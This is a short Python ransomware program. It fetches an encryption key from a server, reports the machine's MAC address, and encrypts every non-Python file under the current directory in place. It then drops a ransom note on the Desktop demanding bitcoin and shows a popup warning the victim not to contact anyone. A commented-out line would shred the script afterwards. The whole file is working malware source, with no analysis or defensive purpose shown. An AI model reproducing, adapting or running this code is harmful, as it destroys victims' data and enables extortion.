import socket, subprocess, os, psutil,platform, tkinter as tk
from cryptography.fernet import Fernet
from tkinter import messagebox
SERVER="localhost"
PORT=12657
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER, PORT))
client.settimeout(5)
print("Connected")
key = client.recv(1024)
fernet = Fernet(key)

def get_mac(fam):
    for interface,snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family==fam:
                yield (interface,(snic.address))
if platform.system()=="Linux":
    res=dict(get_mac(psutil.AF_LINK))
    eth_interface=bytes(res['eth0'].encode())
    client.send(eth_interface)
for dir_tuple in os.walk(os.getcwd()):
    for file in dir_tuple[2]:
        if not file.endswith('py'):
            with open(str(file), "rb") as f:
                data = f.read()
            with open(str(file), "wb") as f:
                f.write(fernet.encrypt(data))
with open(f"{os.environ.get('HOME')}/Desktop/README.txt","w") as f:
    f.writelines(["All your files have been encrypted.","You can only decrypt them with a key that we have. To get the key transfer BC30 to bitcoin address 11SAs3HwDkytKNHoOlaMJSoBW4EY3oy5Gm","expect us"])
root = tk.Tk()
root.withdraw()
if messagebox.showwarning('???', 'All your files have been encrypted. Check your Desktop for README.txt for further instructions. Do not contact the authors in any way else the decryption key will be deleted.'):
    root.destroy()
    #subprocess.run(["shred",f"-n 5 -z {os.path.basename(__file__)}"])
root.mainloop()